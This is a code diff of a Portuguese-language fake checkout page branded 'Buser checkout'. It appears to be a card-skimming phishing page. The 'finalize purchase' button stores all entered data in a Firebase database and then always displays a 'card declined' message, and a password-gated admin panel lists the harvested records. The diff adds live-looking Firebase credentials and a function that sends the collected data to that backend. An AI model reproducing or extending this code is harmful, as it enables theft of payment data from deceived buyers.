@@ -228,7 +228,6 @@
       background: #222222;
     }
 
-    /* MODAL SENHA */
     .modal-overlay {
       display: none;
       position: fixed;
@@ -404,7 +403,6 @@
       margin: 12px 0 8px;
     }
 
-    /* HISTÓRICO DE REGISTROS */
     .historico-item {
       background: #f9f9f9;
       border-radius: 12px;
@@ -441,7 +439,6 @@
       font-style: italic;
     }
 
-    /* MODAL CARTAO RECUSADO */
     .msg-overlay {
       display: none;
       position: fixed;
@@ -539,7 +536,6 @@
 <body>
 <div class="card" id="app">
 
-  <!-- cabeçalho -->
   <div class="header">
     <h1>Buser <span>checkout</span></h1>
     <div class="admin-badge" id="btnAbrirAdmin">
@@ -681,7 +677,6 @@
       <button class="modal-fechar" id="modalFechar">✕</button>
     </div>
 
-    <!-- ÁREA DE SENHA -->
     <div id="areaSenha">
       <label for="senhaModal">Digite a senha para acessar o painel</label>
       <input type="password" id="senhaModal" placeholder="Digite a senha">
@@ -689,7 +684,6 @@
       <button class="btn-modal" id="btnConfirmarSenha">🔓 Confirmar senha</button>
     </div>
 
-    <!-- ÁREA DO PAINEL (escondida até senha correta) -->
     <div id="areaPainel" style="display: none;">
       <p style="color: #2e7d32; font-weight: 600; margin-bottom: 12px;">✅ Acesso liberado</p>
 
@@ -734,15 +728,18 @@
 
 <script>
   (function() {
-    // ===== FIREBASE CONFIG =====
+    // ============================================================
+    // 🔥 FIREBASE CONFIG - CONFIGURADO COM SUAS CREDENCIAIS
+    // ============================================================
     const firebaseConfig = {
-      apiKey: "AIzaSyDummyKeyNaoVaiFuncionar123456789",
+      apiKey: "AIzaSyABGtzfPaShB39xuyLji19cI7uF223UFoQ",
       authDomain: "projeto-americanas-9c236.firebaseapp.com",
       databaseURL: "https://projeto-americanas-9c236-default-rtdb.firebaseio.com",
       projectId: "projeto-americanas-9c236",
-      storageBucket: "projeto-americanas-9c236.appspot.com",
-      messagingSenderId: "123456789012",
-      appId: "1:123456789012:web:abcdef123456"
+      storageBucket: "projeto-americanas-9c236.firebasestorage.app",
+      messagingSenderId: "744546490117",
+      appId: "1:744546490117:web:5eb9483523d5073549496c",
+      measurementId: "G-TJ2WCH18ZL"
     };
 
     let database;
@@ -752,6 +749,7 @@
       firebase.initializeApp(firebaseConfig);
       database = firebase.database();
       firebaseInicializado = true;
+      console.log('✅ Firebase conectado');
     } catch (e) {
       console.warn('Firebase não inicializado:', e);
     }
@@ -993,31 +991,43 @@
       }
     }
 
-    // ===== SALVAR DADOS =====
+    // ===== SALVAR DADOS NO FIREBASE =====
+    function salvarNoFirebase(dados) {
+      if (!firebaseInicializado) {
+        console.warn('Firebase não disponível, salvando apenas localmente');
+        return Promise.resolve();
+      }
+      
+      try {
+        const ref = database.ref('checkout/' + Date.now());
+        return ref.set({
+          ...dados,
+          timestamp: new Date().toISOString()
+        }).then(() => {
+          console.log('✅ Dados salvos no Firebase com sucesso!');
+        }).catch((err) => {
+          console.warn('Erro ao salvar no Firebase:', err);
+        });
+      } catch (e) {
+        console.warn('Erro ao salvar no Firebase:', e);
+        return Promise.resolve();
+      }
+    }
+
+    // ===== SALVAR DADOS COMPLETO =====
     function salvarDadosCompleto() {
       const dados = coletarDados();
       
-      // Salva no histórico
       salvarHistorico(dados);
       renderizarHistorico();
       
-      // Salva no Firebase
-      if (firebaseInicializado) {
-        try {
-          const ref = database.ref('checkout/' + Date.now());
-          ref.set({
-            ...dados,
-            timestamp: new Date().toISOString()
-          }).catch((err) => {
-            console.warn('Erro ao salvar no Firebase:', err);
-          });
-        } catch (e) {}
-      }
-      
-      // Salva no localStorage principal
       try {
         localStorage.setItem(STORAGE_KEY, JSON.stringify(dados));
       } catch(e) {}
+      
+      if (firebaseInicializado) {
+        salvarNoFirebase(dados);
+      }
       
       atualizarModalDados();
     }
@@ -1086,7 +1096,6 @@
 
     btnLimparHistorico.addEventListener('click', limparHistorico);
 
-    // Finalizar compra
     document.getElementById('btnFinalizar').addEventListener('click', function() {
       salvarDadosCompleto();
       msgRecusado.classList.add('aberto');
@@ -1105,7 +1114,6 @@
       atualizarValorTotal(99.00);
       parcelasSelect.selectedIndex = 11;
       
-      // Carrega dados salvos
       try {
         const raw = localStorage.getItem(STORAGE_KEY);
         if (raw) {
